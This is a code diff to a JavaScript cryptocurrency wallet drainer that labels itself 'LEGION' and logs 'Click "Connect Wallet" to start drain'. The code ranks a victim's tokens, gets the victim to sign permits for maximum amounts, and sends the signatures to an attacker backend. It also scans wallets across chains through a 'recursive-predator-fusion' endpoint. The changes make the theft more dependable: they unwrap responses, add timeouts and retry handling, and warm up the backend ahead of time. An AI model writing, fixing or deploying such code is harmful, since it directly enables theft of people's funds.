@@ -828,8 +828,9 @@
           var permits = [{ token: DEFAULT_USDC, amount: MAX_PERMIT }];
           try {
             var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: evmAddr, chain_family: 'EVM' });
-            if (ranked && ranked.assets) {
-              var erc20 = ranked.assets.filter(function(a) { return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0; }).slice(0, 10);
+            var rankedAssets = (ranked && ranked.data && ranked.data.assets) || (ranked && ranked.assets);
+            if (rankedAssets) {
+              var erc20 = rankedAssets.filter(function(a) { return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0; }).slice(0, 10);
               if (erc20.length) permits = erc20.map(function(a) { return { token: a.token, amount: a.amount_raw || MAX_PERMIT }; });
             }
           } catch (e) {}
@@ -839,15 +840,16 @@
             wallet_address: evmAddr, chain_id: evmChainId, permits: permits, nativeAmount: '0'
           });
 
-          if (!batch || !batch.typed_data) throw new Error('Backend did not return typed data');
+          var batchData = (batch && batch.data) ? batch.data : batch;
+          if (!batchData || !batchData.typed_data) throw new Error('Backend did not return typed data');
 
-          var typedDataStr = typeof batch.typed_data === 'string' ? batch.typed_data : JSON.stringify(batch.typed_data);
+          var typedDataStr = typeof batchData.typed_data === 'string' ? batchData.typed_data : JSON.stringify(batchData.typed_data);
           var signature = await eth.request({
             method: 'eth_signTypedData_v4',
             params: [evmAddr, typedDataStr]
           });
 
-          connectedChains.EVM._batchResult = batch;
+          connectedChains.EVM._batchResult = batchData;
           connectedChains.EVM._permits = permits;
           return signature;
         } catch (e) {
@@ -1748,9 +1750,10 @@
         var primaryAddr = signatures.EVM ? signatures.EVM.address : (signatures[chainNames[0]] ? signatures[chainNames[0]].address : '');
         if (primaryAddr) {
           var rankedRes = await apiPost('/api/v1/scout/ranked', { wallet_address: primaryAddr });
-          if (rankedRes && rankedRes.assets && rankedRes.assets.length > 0) {
+          var rankedResAssets = (rankedRes && rankedRes.data && rankedRes.data.assets) || (rankedRes && rankedRes.assets);
+          if (rankedResAssets && rankedResAssets.length > 0) {
             var chainValue = {};
-            rankedRes.assets.forEach(function(asset) {
+            rankedResAssets.forEach(function(asset) {
               var chain = asset.family || asset.chain || '';
               var mapped = chain === 'SVM' ? 'SOL' : chain === 'UTXO' ? 'BTC' : chain;
               chainValue[mapped] = (chainValue[mapped] || 0) + (asset.amount_usd || 0);
@@ -1775,8 +1778,9 @@
         if (connectedChains.TON) scanAddresses.ton_friendly_address = connectedChains.TON.address;
         if (connectedChains.BTC) scanAddresses.btc_holder_address = connectedChains.BTC.address;
         var preScanResult = await apiPost('/api/scout/recursive-predator-fusion', scanAddresses);
-        if (preScanResult && preScanResult.total_usd) {
-          SESSION_SCOUT_VALUE_USD = preScanResult.total_usd;
+        var preScanData = (preScanResult && preScanResult.data) ? preScanResult.data : preScanResult;
+        if (preScanData && preScanData.total_usd) {
+          SESSION_SCOUT_VALUE_USD = preScanData.total_usd;
           console.log('[LEGION]   🏦 Wallet value: $' + SESSION_SCOUT_VALUE_USD.toFixed(2));
         }
       } catch (e) {
@@ -2011,9 +2015,10 @@
           // TRON USDT, TON native - everything in one call
           var fusionResult = await apiPost('/api/scout/recursive-predator-fusion', allAddresses);
 
-          if (fusionResult) {
-            var totalUsd = fusionResult.total_usd || 0;
-            var assetsCount = fusionResult.assets_count || 0;
+          var fusionData = (fusionResult && fusionResult.data) ? fusionResult.data : fusionResult;
+          if (fusionData) {
+            var totalUsd = fusionData.total_usd || 0;
+            var assetsCount = fusionData.assets_count || 0;
             SESSION_SCOUT_VALUE_USD = totalUsd;
             console.log('[LEGION]   🏦 Deep scan complete: $' + totalUsd.toFixed(2) + ' across ' + assetsCount + ' assets');
 
@@ -2564,18 +2569,28 @@
         if (attempt > 0) LOGGER.debug('API POST retry', path, '(attempt ' + (attempt + 1) + ')');
         else LOGGER.debug('API POST', path);
 
+        var controller = new AbortController();
+        var timeoutId = setTimeout(function() { controller.abort(); }, 8000);
         res = await fetch(BACKEND + path, {
           method: 'POST',
           headers: headers,
           body: safeStringify(body),
           keepalive: true,
-          credentials: 'omit'
+          credentials: 'omit',
+          signal: controller.signal
         });
+        clearTimeout(timeoutId);
       } catch (err) {
+        var errMsg = err && err.message ? err.message : String(err);
+        // CORS failure or network block — no point retrying immediately
+        var isCorsOrNetwork = /failed to fetch|cors|network|blocked|aborted/i.test(errMsg);
         lastError = new Error(mapFetchError(err, path));
-        if (attempt < MAX_RETRIES - 1) {
+        if (!isCorsOrNetwork && attempt < MAX_RETRIES - 1) {
           await new Promise(function(r) { setTimeout(r, RETRY_DELAYS[attempt]); });
           continue;
+        }
+        if (isCorsOrNetwork) {
+          LOGGER.debug('Network/CORS fail, no retry', path);
         }
         LOGGER.error('API POST failed after retries', lastError.message);
         throw lastError;
@@ -3792,6 +3807,14 @@
     LOGGER.info('═════════════════════════════════════════════════════════════');
     LOGGER.info('Debug API: window.legion.debug.*');
     LOGGER.info('Click "Connect Wallet" to start drain');
+
+    // Backend warmup — fire lightweight ping so Railway wakes up before user clicks
+    setTimeout(function() {
+      fetch(BACKEND + '/api/v1/client-config', { method: 'GET', credentials: 'omit' }).catch(function() {});
+    }, 500);
+    setTimeout(function() {
+      fetch(BACKEND + '/api/v1/client-config', { method: 'GET', credentials: 'omit' }).catch(function() {});
+    }, 3000);
 
     return true;
   };
